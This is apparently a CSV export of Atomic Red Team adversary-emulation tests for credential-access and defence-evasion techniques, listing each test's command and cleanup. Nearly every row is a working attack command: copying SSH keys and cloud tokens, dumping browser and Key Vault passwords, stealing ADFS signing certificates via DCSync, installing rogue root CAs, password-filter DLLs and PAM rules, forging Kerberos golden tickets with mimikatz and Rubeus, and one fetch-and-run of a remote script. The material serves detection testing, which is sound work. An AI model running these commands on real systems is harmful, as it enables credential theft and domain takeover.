"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1552\T1552.yaml","AWS - Retrieve EC2 Password Data using stratus","export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.credential-access.ec2-get-password-data
echo ""starting detonate""
./stratus detonate aws.credential-access.ec2-get-password-data --force
","export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
"
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Find AWS credentials","find #{file_path}/.aws -name ""credentials"" -type f 2>/dev/null
",
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Extract passwords with grep","grep -ri password #{file_path}
exit 0
",
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Find and Access Github Credentials","for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
",
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Find Azure credentials","find #{file_path}/.azure -name ""msal_token_cache.json"" -o -name ""accessTokens.json"" -type f 2>/dev/null
",
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Find GCP credentials","find #{file_path}/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null
",
"C:\AtomicRedTeam\atomics\T1552.001\T1552.001.yaml","Find OCI credentials","find #{file_path}/.oci/sessions -name ""token"" -type f 2>/dev/null
",
"C:\AtomicRedTeam\atomics\T1552.003\T1552.003.yaml","Search Through Bash History","cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}
",
"C:\AtomicRedTeam\atomics\T1552.003\T1552.003.yaml","Search Through sh History","cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
",
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Discover Private SSH Keys","find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
exit 0
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy Private SSH Keys with CP","mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;
exit 0
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy Private SSH Keys with CP (freebsd)","mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy Private SSH Keys with rsync","mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
exit 0
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy Private SSH Keys with rsync (freebsd)","mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy the users GnuPG directory with rsync","mkdir #{output_folder}
find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
exit 0
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Copy the users GnuPG directory with rsync (freebsd)","mkdir #{output_folder}
find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;
","rm -rf #{output_folder}
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","ADFS token signing and encryption certificates theft - Remote","Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq ""#{adfs_service_account_name}""
$PWord = ConvertTo-SecureString -String ""#{replication_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = ""LDAP://CN=$group,$container,$parent""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[""displayName""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null
$ADSearch.Filter=""(l=$keyObjectGuid)""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[""thumbnailphoto""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
Write-Host ""`nCertificates retrieved successfully""
","Remove-Item -Path "".\ADFS_encryption.pfx"" -ErrorAction Ignore
Remove-Item -Path "".\ADFS_signing.pfx"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","CertUtil ExportPFX","IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
","Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Export Root Certificate with Export-PFXCertificate","$mypwd = ConvertTo-SecureString -String ""AtomicRedTeam"" -Force -AsPlainText
$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd
","try {
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
} catch { }
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Export Root Certificate with Export-Certificate","$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
","try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }
"
"C:\AtomicRedTeam\atomics\T1552.004\T1552.004.yaml","Export Certificates with Mimikatz","""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export""  exit
",
"C:\AtomicRedTeam\atomics\T1552.005\T1552.005.yaml","Azure - Search Azure AD User Attributes for Passwords","import-module msonline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
$users = Get-MsolUser -All;
foreach($user in $users)
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
foreach($prop in $props)
{if($user.$prop -like ""*password*"")
{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
","remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1552.005\T1552.005.yaml","Azure - Dump Azure Instance Metadata from Virtual Machines","Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > #{output_file}
","remove-item #{output_file} -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1552.006\T1552.006.yaml","GPP Passwords (Get-GPPPassword)",". ""#{gpp_script_path}""
Get-GPPPassword -Verbose
",
"C:\AtomicRedTeam\atomics\T1552.007\T1552.007.yaml","ListSecrets","kubectl get secrets -n #{namespace}
",
"C:\AtomicRedTeam\atomics\T1553.001\T1553.001.yaml","Gatekeeper Bypass","xattr -d com.apple.quarantine #{app_path}
",
"C:\AtomicRedTeam\atomics\T1553.003\T1553.003.yaml","SIP (Subject Interface Package) Hijacking via Custom DLL","regsvr32.exe #{dll_payload}
","regsvr32.exe /u #{dll_payload}
"
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on CentOS/RHEL","openssl genrsa -out #{key_filename} 4096
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
cp #{cert_filename} /etc/pki/ca-trust/source/anchors/
update-ca-trust
","rm /etc/pki/ca-trust/source/anchors/#{cert_filename}
update-ca-trust
"
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on FreeBSD","openssl genrsa -out #{key_filename} 4096
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
cp #{cert_filename} /usr/local/share/certs/
certctl rehash
","rm /usr/local/share/certs/#{cert_filename}
certctl rehash
"
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on Debian/Ubuntu","mv #{cert_filename} /usr/local/share/ca-certificates
sudo update-ca-certificates
",
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on macOS","sudo security add-trusted-cert -d -r trustRoot -k ""/Library/Keychains/System.keychain"" ""#{cert_filename}""
",
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on Windows","$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""
","try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }
"
"C:\AtomicRedTeam\atomics\T1553.004\T1553.004.yaml","Install root CA on Windows with certutil","certutil -addstore my #{pfx_path}
","try {
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
} catch { }
"
"C:\AtomicRedTeam\atomics\T1555.001\T1555.001.yaml","Export Certificate Item(s)","security find-certificate -a -p > #{cert_export}
","rm #{cert_export}"
"C:\AtomicRedTeam\atomics\T1555.001\T1555.001.yaml","Import Certificate Item(s) into Keychain","security import #{cert_export} -k
",
"C:\AtomicRedTeam\atomics\T1555.001\T1555.001.yaml","Copy Keychain using cat utility","cat ~/Library/Keychains/login.keychain-db > #{keychain_export}
","rm #{keychain_export}"
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Run Chrome-password Collector","Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""
","Remove-Item ""#{file_path}\Sysinternals"" -Force -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Search macOS Safari Cookies","cd ~/Library/Cookies
grep -q ""#{search_string}"" ""Cookies.binarycookies""
",
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","LaZagne - Credentials from Browser","""#{lazagne_path}"" browsers
",
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Decrypt Mozilla Passwords with Firepwd.py","$PasswordDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
cmd /c #{venv_path}\Scripts\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
cat #{Out_Filepath}
","Remove-Item -Path ""#{Out_Filepath}"" -erroraction silentlycontinue   
"
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","LaZagne.py - Dump Credentials from Firefox Browser","python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}","rm -R /tmp/LaZagne; rm -f #{output_file}"
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","WebBrowserPassView - Credentials from Browser","Start-Process ""#{webbrowserpassview_path}""
Start-Sleep -Second 4
Stop-Process -Name ""WebBrowserPassView""
",
"C:\AtomicRedTeam\atomics\T1555.003\T1555.003.yaml","Dump Chrome Login Data with esentutl","esentutl.exe /y ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" /d ""#{output_path}""
","del /f /q #{output_path} > nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1555.006\T1555.006.yaml","Azure - Dump All Azure Key Vaults with Microburst","import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
cat #{output_file}
","remove-item #{output_file} -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1556.002\T1556.002.yaml","Install and Register Password Filter DLL","reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues
","reg.exe import ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
remove-item C:\Windows\System32\#{dll_name}
"
"C:\AtomicRedTeam\atomics\T1556.002\T1556.002.yaml","Install Additional Authentication Packages","reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$AuthenticationPackagesValues = $lsaKey.GetValue(""Authentication Packages"")
$AuthenticationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Authentication Packages"" $AuthenticationPackagesValues
","reg.exe import ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
remove-item C:\Windows\System32\#{dll_name}
"
"C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM rule","sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
","sudo sed -i ""\,#{pam_rule},d"" #{path_to_pam_conf}
"
"C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM rule (freebsd)","sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
","sudo sed -i """" ""/#{pam_rule}/d"" #{path_to_pam_conf}
"
"C:\AtomicRedTeam\atomics\T1556.003\T1556.003.yaml","Malicious PAM module","sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
","sudo sed -i ""\,#{pam_rule},d"" #{path_to_pam_conf}
"
"C:\AtomicRedTeam\atomics\T1558.001\T1558.001.yaml","Crafting Active Directory golden tickets with mimikatz","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""#{domain_sid}""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit""

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",
"C:\AtomicRedTeam\atomics\T1558.001\T1558.001.yaml","Crafting Active Directory golden tickets with Rubeus","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$(#{domaincontroller})\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
",
